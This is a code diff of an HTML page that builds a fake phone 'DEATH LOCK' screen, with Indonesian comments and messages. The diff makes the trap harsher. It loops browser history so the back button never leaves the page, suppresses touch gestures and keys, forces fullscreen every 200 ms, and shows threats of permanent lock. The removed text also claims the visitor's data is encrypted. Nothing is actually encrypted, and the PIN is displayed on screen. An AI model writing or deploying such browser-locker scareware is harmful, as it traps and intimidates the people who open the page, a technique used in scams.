@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>🔒 SYSTEM LOCKED 🔒</title>
+    <title>🔒 DEATH LOCK 🔒</title>
     <style>
         * {
             margin: 0;
@@ -11,7 +11,6 @@
             box-sizing: border-box;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
-            -webkit-touch-callout: none;
         }
         
         body {
@@ -37,20 +36,28 @@
             width: 90%;
             max-width: 400px;
             text-align: center;
-            box-shadow: 0 0 50px #f00;
+            box-shadow: 0 0 100px #f00;
+            position: relative;
+            z-index: 9999;
         }
         
-        .header {
-            font-size: 24px;
+        .glitch {
+            font-size: 32px;
             font-weight: bold;
+            animation: glitch 0.3s infinite;
             margin-bottom: 10px;
-            text-transform: uppercase;
-            color: #f00;
-            text-shadow: 0 0 10px #f00;
         }
         
-        .subheader {
-            font-size: 12px;
+        @keyframes glitch {
+            0% { text-shadow: 2px 2px #f00, -2px -2px #00f; }
+            25% { text-shadow: -2px 2px #f00, 2px -2px #00f; }
+            50% { text-shadow: 2px -2px #f00, -2px 2px #00f; }
+            75% { text-shadow: -2px -2px #f00, 2px 2px #00f; }
+            100% { text-shadow: 2px 2px #f00, -2px -2px #00f; }
+        }
+        
+        .sub {
+            font-size: 14px;
             color: #f66;
             margin-bottom: 20px;
             border-bottom: 1px solid #f00;
@@ -61,13 +68,13 @@
             background: #1a0000;
             border: 2px solid #f00;
             border-radius: 10px;
-            padding: 15px;
+            padding: 20px;
             margin: 15px 0;
-            font-size: 48px;
+            font-size: 56px;
             letter-spacing: 15px;
             font-weight: bold;
             color: #f00;
-            text-shadow: 0 0 10px #f00;
+            text-shadow: 0 0 20px #f00;
         }
         
         .keypad {
@@ -82,19 +89,17 @@
             border: 2px solid #f00;
             border-radius: 10px;
             padding: 20px;
-            font-size: 32px;
+            font-size: 36px;
             font-weight: bold;
             color: #f00;
             cursor: pointer;
-            transition: 0.1s;
-            box-shadow: 0 0 15px rgba(255,0,0,0.3);
-            text-shadow: 0 0 5px #f00;
+            box-shadow: 0 0 15px rgba(255,0,0,0.5);
         }
         
         .key:active {
             background: #f00;
             color: #000;
-            transform: scale(0.95);
+            transform: scale(0.9);
         }
         
         .enter-btn {
@@ -102,235 +107,312 @@
             border: none;
             border-radius: 10px;
             padding: 20px;
-            font-size: 28px;
+            font-size: 32px;
             font-weight: bold;
             color: #000;
             width: 100%;
             margin: 10px 0;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 30px #f00;
+            box-shadow: 0 0 50px #f00;
+            animation: pulse 1s infinite;
         }
         
-        .enter-btn:active {
-            background: #900;
-            transform: scale(0.98);
+        @keyframes pulse {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.7; }
         }
         
         .timer {
-            font-size: 28px;
+            font-size: 36px;
             color: #ff0;
             margin: 15px 0;
             font-weight: bold;
         }
         
         .warning {
-            font-size: 14px;
+            font-size: 16px;
             color: #f00;
-            margin: 10px 0;
-            animation: blink 1s infinite;
+            animation: blink 0.5s infinite;
         }
         
         @keyframes blink {
             0%,100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            50% { opacity: 0.2; }
         }
         
-        .status {
-            font-size: 12px;
+        .counter {
+            font-size: 14px;
             color: #f66;
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #f00;
-            text-align: left;
+            margin-top: 10px;
         }
         
-        /* Fullscreen fix */
-        :-webkit-full-screen {
+        /* Overlay buat block touch */
+        .touch-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
+            background: transparent;
+            z-index: 9998;
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">⚠️ TERKUNCI ⚠️</div>
-        <div class="subheader">MASUKKAN PIN UNTUK KELUAR</div>
+        <div class="glitch">💀 DEATH LOCK 💀</div>
+        <div class="sub">GA BISA KELUAR SAMPE KAPAN PUN</div>
         
         <div class="pin-display" id="pinDisplay">_ _ _</div>
         
         <div class="keypad" id="keypad"></div>
         
-        <button class="enter-btn" onclick="checkPin()" id="enterBtn">ENTER</button>
+        <button class="enter-btn" onclick="checkPin()">ENTER</button>
         
         <div class="timer" id="timer">04:34</div>
-        <div class="warning">PIN: 100</div>
-        
-        <div class="status">
-            <div id="statusMsg">>> STATUS: LOCKED</div>
-        </div>
+        <div class="warning">⚠️ PIN: 100 ⚠️</div>
+        <div class="counter" id="counter">BACK PRESS: 0</div>
     </div>
+    
+    <div class="touch-blocker" id="touchBlocker"></div>
 
     <script>
         // ===========================================
-        // MOBILE LOCKDOWN - BENERAN GAK BISA KELUAR
+        // INFINITE LOCK - GAK BISA KELUAR SAMPE KAPAN PUN
         // ===========================================
         
         let enteredPin = "";
         const correctPin = "100";
         let attempts = 0;
-        let timeLeft = 274; // 04:34 = 274 detik
+        let timeLeft = 274;
+        let backCount = 0;
+        let isLocked = true;
         
-        // ===== 1. BLOCK SEMUA TOMBOL HP =====
+        // ===== 1. INFINITE HISTORY LOOP =====
+        // Ini yg bikin back button GAK PERNAH BISA KELUAR
         
-        // Block tombol back Android
-        history.pushState(null, null, location.href);
-        window.onpopstate = function(event) {
+        function setupInfiniteHistory() {
+            // Push state pertama
             history.pushState(null, null, location.href);
-            showStatus("❌ TOMBOL BACK DIBLOCK!");
-            timeLeft -= 5;
-            return false;
-        };
+            
+            // Setiap kali back dipencet, kita push state baru
+            window.addEventListener('popstate', function(event) {
+                if (isLocked) {
+                    backCount++;
+                    document.getElementById('counter').innerText = `BACK PRESS: ${backCount}`;
+                    
+                    // Push 3 state sekaligus biar makin dalem
+                    history.pushState(null, null, location.href);
+                    history.pushState(null, null, location.href);
+                    history.pushState(null, null, location.href);
+                    
+                    // Hukuman makin berat
+                    timeLeft = Math.max(0, timeLeft - 5);
+                    
+                    // Efek visual
+                    document.body.style.backgroundColor = '#f00';
+                    setTimeout(() => {
+                        document.body.style.backgroundColor = '#000';
+                    }, 100);
+                    
+                    // Kalo kebanyakan back, tambah hukuman
+                    if (backCount % 10 === 0) {
+                        timeLeft -= 30;
+                        alert(`⚠️ UDAH ${backCount} KALI BACK! MAU KELUAR? GA BISA!`);
+                    }
+                    
+                    // Kalo back > 50, aktifin mode gila
+                    if (backCount > 50) {
+                        document.querySelector('.container').style.transform = 'rotate(180deg)';
+                    }
+                    
+                    // Kalo back > 100, reset counter tapi tetep gak bisa keluar
+                    if (backCount > 100) {
+                        backCount = 0;
+                        alert('💀 100 KALI BACK? LO KERAS KEPALA! TAPI TETEP GA BISA KELUAR 💀');
+                    }
+                }
+            });
+        }
         
-        // Block semua tombol fisik
+        // ===== 2. BLOCK SEMUA TOMBOL FISIK =====
+        
         document.addEventListener('keydown', function(e) {
             e.preventDefault();
+            e.stopPropagation();
             
-            // Block volume, power, back, dll
-            const blockedKeys = [
-                'Backspace', 'Escape', 'F11', 'F12',
-                'VolumeUp', 'VolumeDown', 'Power', 'Home'
-            ];
+            // Block semua key
+            const key = e.key;
             
-            if (blockedKeys.includes(e.key)) {
-                showStatus("❌ TOMBOL FISIK DIBLOCK!");
-                return false;
+            // Volume up/down
+            if (key.includes('Volume')) {
+                timeLeft -= 2;
+                showFeedback('🔇 VOLUME DIBLOCK!');
             }
             
-            // Handle input angka
-            if (e.key >= '0' && e.key <= '9') {
-                addPin(e.key);
+            // Power (deteksi via screen off)
+            if (key === 'Power' || key === 'PowerOff') {
+                timeLeft -= 10;
+                showFeedback('⚡ POWER DIBLOCK!');
+            }
+            
+            // Input angka
+            if (key >= '0' && key <= '9') {
+                addPin(key);
             }
             
             // Enter
-            if (e.key === 'Enter') {
+            if (key === 'Enter') {
                 checkPin();
+            }
+            
+            // Backspace
+            if (key === 'Backspace' || key === 'Delete') {
+                deletePin();
             }
             
             return false;
         });
         
-        // ===== 2. BLOCK SEMUA GESTURE HP =====
+        // ===== 3. BLOCK SEMUA GESTURE =====
         
-        // Block swipe back
+        let touchStartX, touchStartY, touchStartTime;
+        
         document.addEventListener('touchstart', function(e) {
             e.preventDefault();
+            const touch = e.touches[0];
+            touchStartX = touch.clientX;
+            touchStartY = touch.clientY;
+            touchStartTime = Date.now();
         }, { passive: false });
         
         document.addEventListener('touchmove', function(e) {
             e.preventDefault();
+            
+            const touch = e.touches[0];
+            const deltaX = touch.clientX - touchStartX;
+            const deltaY = touch.clientY - touchStartY;
+            
+            // Deteksi gesture
+            if (Math.abs(deltaX) > 50) {
+                // Swipe kiri/kanan
+                showFeedback('⬅️ SWIPE DIBLOCK!');
+                timeLeft -= 2;
+                
+                // Balikin posisi
+                document.body.style.transform = 'translateX(0)';
+            }
+            
+            if (deltaY < -50) {
+                // Swipe up (recent apps)
+                showFeedback('⬆️ RECENT APPS DIBLOCK!');
+                timeLeft -= 5;
+                
+                // Paksa balik
+                window.focus();
+            }
+            
+            if (deltaY > 50 && touch.clientY < 100) {
+                // Swipe down dari atas (notifikasi)
+                showFeedback('⬇️ NOTIFIKASI DIBLOCK!');
+                timeLeft -= 3;
+            }
+            
+            if (deltaY > 100 && touch.clientY > window.innerHeight - 100) {
+                // Swipe up dari bawah (home)
+                showFeedback('🏠 HOME GESTURE DIBLOCK!');
+                timeLeft -= 10;
+                
+                // Paksa fullscreen
+                forceFullscreen();
+            }
+            
         }, { passive: false });
         
         document.addEventListener('touchend', function(e) {
             e.preventDefault();
-        }, { passive: false });
-        
-        // Block gesture dari tepi layar
-        document.addEventListener('touchstart', function(e) {
-            const touch = e.touches[0];
-            if (touch.clientX < 50 || touch.clientX > window.innerWidth - 50) {
-                // Swipe dari tepi
-                showStatus("❌ GESTURE TEPI DIBLOCK!");
-                e.preventDefault();
-                timeLeft -= 2;
+            
+            const touchDuration = Date.now() - touchStartTime;
+            
+            // Deteksi long press
+            if (touchDuration > 1000) {
+                showFeedback('⏱️ LONG PRESS DIBLOCK!');
+                timeLeft -= 3;
             }
+            
         }, { passive: false });
         
-        // ===== 3. BLOCK SEMUA NAVIGASI =====
+        // ===== 4. BLOCK 3 JARI (RECENT APPS) =====
         
-        // Block menu recent apps (via gesture)
         document.addEventListener('touchstart', function(e) {
             if (e.touches.length >= 3) {
-                // 3 jari = recent apps
-                showStatus("❌ RECENT APPS DIBLOCK!");
+                showFeedback('👆 3 JARI! RECENT APPS DIBLOCK!');
+                timeLeft -= 15;
                 e.preventDefault();
-                timeLeft -= 10;
+                
+                // Getar visual
+                document.body.style.transform = 'scale(0.95)';
+                setTimeout(() => {
+                    document.body.style.transform = 'scale(1)';
+                }, 200);
             }
         });
         
-        // Block home button (via gesture)
-        let touchStartY = 0;
-        document.addEventListener('touchstart', function(e) {
-            touchStartY = e.touches[0].clientY;
-        });
-        
-        document.addEventListener('touchmove', function(e) {
-            const touch = e.touches[0];
-            if (touch.clientY - touchStartY > 100) {
-                // Swipe up dari bawah = home
-                showStatus("❌ HOME GESTURE DIBLOCK!");
-                e.preventDefault();
-                timeLeft -= 5;
-            }
-        });
-        
-        // ===== 4. PAKSA FULLSCREEN DI HP =====
+        // ===== 5. PAKSA FULLSCREEN =====
         
         function forceFullscreen() {
             if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen().catch(err => {
-                    // Coba lagi
-                    setTimeout(forceFullscreen, 100);
-                });
+                document.documentElement.requestFullscreen().catch(() => {});
             }
         }
         
-        // Paksa fullscreen terus
+        setInterval(forceFullscreen, 200);
         forceFullscreen();
-        setInterval(forceFullscreen, 500);
         
-        // Orientasi paksa landscape/portrait
-        screen.orientation.lock('portrait').catch(() => {});
+        // ===== 6. DETEKSI KELUAR APP =====
         
-        // ===== 5. CEK KELUAR DARI APP =====
-        
+        let hiddenCount = 0;
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
-                // Balik lagi
+                hiddenCount++;
+                showFeedback(`🚫 KELUAR APP PERCOBAAN ${hiddenCount}`);
+                
+                // Hukuman berat
+                timeLeft -= 30;
+                
+                // Kalo kebanyakan keluar, reset timer ke awal
+                if (hiddenCount % 3 === 0) {
+                    timeLeft = 274;
+                    showFeedback('⚠️ TIMER DI-RESET! MULAI LAGI!');
+                }
+                
+                // Paksa balik
                 window.focus();
                 forceFullscreen();
-                timeLeft -= 30; // Hukuman
-                showStatus("❌ KELUAR APP? HUKUMAN -30 DETIK!");
             }
         });
         
-        window.addEventListener('blur', function() {
-            setTimeout(() => {
-                window.focus();
-            }, 10);
-        });
+        // ===== 7. BLOCK SCREENSHOT =====
         
-        // ===== 6. BLOCK SCREENSHOT =====
-        
-        // Visual feedback kalo screenshot
         document.addEventListener('keyup', function(e) {
             if (e.key === 'PrintScreen' || (e.ctrlKey && e.key === 's')) {
-                showStatus("❌ SCREENSHOT DIBLOCK!");
-                timeLeft -= 5;
+                showFeedback('📸 SCREENSHOT DIBLOCK!');
+                timeLeft -= 10;
+                
+                // Flash putih
+                document.body.style.backgroundColor = '#fff';
+                setTimeout(() => {
+                    document.body.style.backgroundColor = '#000';
+                }, 100);
             }
         });
         
-        // ===== 7. FUNGSI PIN =====
+        // ===== 8. FUNGSI PIN =====
         
         function createKeypad() {
             const keypad = document.getElementById('keypad');
-            const keys = [
-                '1', '2', '3',
-                '4', '5', '6',
-                '7', '8', '9',
-                'C', '0', 'X'
-            ];
+            const keys = ['1','2','3','4','5','6','7','8','9','C','0','X'];
             
             keys.forEach(key => {
                 const btn = document.createElement('div');
@@ -379,6 +461,7 @@
         function checkPin() {
             if (enteredPin === correctPin) {
                 // PIN BENAR
+                isLocked = false;
                 document.body.innerHTML = `
                     <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:#0f0; display:flex; justify-content:center; align-items:center; font-family:monospace; font-size:32px; z-index:99999; flex-direction:column;">
                         <div>✅ PIN BENAR</div>
@@ -390,72 +473,94 @@
                     if (document.fullscreenElement) {
                         document.exitFullscreen();
                     }
+                    window.close();
                 }, 2000);
             } else {
                 attempts++;
-                showStatus(`❌ PIN SALAH! PERCOBAAN ${attempts}/5`);
+                showFeedback(`❌ PIN SALAH! PERCOBAAN ${attempts}/5`);
                 
                 if (attempts >= 5) {
-                    // MAX ATTEMPT
+                    // MAX ATTEMPT - MODE GILA
                     document.body.innerHTML = `
-                        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:#f00; display:flex; justify-content:center; align-items:center; font-family:monospace; font-size:32px; z-index:99999; flex-direction:column;">
-                            <div>💀💀💀</div>
-                            <div>PERCOBAAN GAGAL</div>
-                            <div style="font-size:16px; margin-top:20px;">DATA DIENKRIPSI</div>
+                        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:#f00; display:flex; justify-content:center; align-items:center; font-family:monospace; font-size:32px; z-index:99999; flex-direction:column; animation:glitch 0.1s infinite;">
+                            <div>💀💀💀💀💀</div>
+                            <div style="font-size:24px; margin:20px;">5x SALAH!</div>
+                            <div style="font-size:16px;">LOCK PERMANEN</div>
+                            <div style="font-size:12px; margin-top:50px;">GAK BISA KELUAR LAGI</div>
                         </div>
                     `;
                 } else {
                     enteredPin = "";
                     updateDisplay();
-                    timeLeft = Math.max(0, timeLeft - 15);
+                    timeLeft = Math.max(0, timeLeft - 30);
                 }
             }
         }
         
-        function showStatus(msg) {
-            document.getElementById('statusMsg').innerHTML = `>> ${msg}`;
+        function showFeedback(msg) {
+            const counter = document.getElementById('counter');
+            counter.innerHTML = `BACK PRESS: ${backCount} | ${msg}`;
             
-            // Getar dikit (simulasi)
-            document.body.style.transform = 'translateX(5px)';
+            // Efek getar
+            document.body.style.transform = 'translateX(10px)';
             setTimeout(() => {
-                document.body.style.transform = 'translateX(-5px)';
+                document.body.style.transform = 'translateX(-10px)';
             }, 50);
             setTimeout(() => {
-                document.body.style.transform = 'translateX(0)';
+                document.body.style.transform = 'translateX(5px)';
             }, 100);
+            setTimeout(() => {
+                document.body.style.transform = 'translateX(0)';
+            }, 150);
         }
         
         function startTimer() {
-            const timerInterval = setInterval(() => {
-                timeLeft--;
-                
-                if (timeLeft <= 0) {
-                    document.body.innerHTML = `
-                        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:#f00; display:flex; justify-content:center; align-items:center; font-family:monospace; font-size:32px; z-index:99999; flex-direction:column;">
-                            <div>⏰ WAKTU HABIS</div>
-                            <div style="font-size:16px; margin-top:20px;">ENKRIPSI OTOMATIS...</div>
-                        </div>
-                    `;
-                    clearInterval(timerInterval);
+            setInterval(() => {
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    
+                    const mins = Math.floor(timeLeft / 60);
+                    const secs = timeLeft % 60;
+                    document.getElementById('timer').innerText = 
+                        `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+                } else {
+                    // Timer habis tapi tetep gak bisa keluar
+                    document.getElementById('timer').style.color = '#f00';
+                    document.getElementById('timer').innerText = '00:00';
                 }
-                
-                const mins = Math.floor(timeLeft / 60);
-                const secs = timeLeft % 60;
-                document.getElementById('timer').innerText = 
-                    `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
             }, 1000);
         }
+        
+        // ===== 9. TAMBAHAN: BLOCK ASSISTIVE TOUCH =====
+        
+        // Block gesture assistive touch (lingkaran mengambang)
+        document.addEventListener('touchstart', function(e) {
+            // Deteksi sentuhan di area yang mencurigakan
+            for (let i = 0; i < e.touches.length; i++) {
+                const touch = e.touches[i];
+                if (touch.radiusX > 50 || touch.radiusY > 50) {
+                    // Mungkin assistive touch
+                    showFeedback('🔄 ASSISTIVE TOUCH DIBLOCK!');
+                    timeLeft -= 20;
+                    e.preventDefault();
+                }
+            }
+        });
         
         // INIT
         window.onload = function() {
             createKeypad();
+            setupInfiniteHistory();
             startTimer();
             updateDisplay();
+            forceFullscreen();
             
-            // Push state buat block back
-            history.pushState(null, null, location.href);
+            // Push state awal
+            for (let i = 0; i < 10; i++) {
+                history.pushState(null, null, location.href);
+            }
             
-            showStatus(">> GA BISA KELUAR!");
+            showFeedback('GA BISA KELUAR!');
         };
     </script>
 </body>
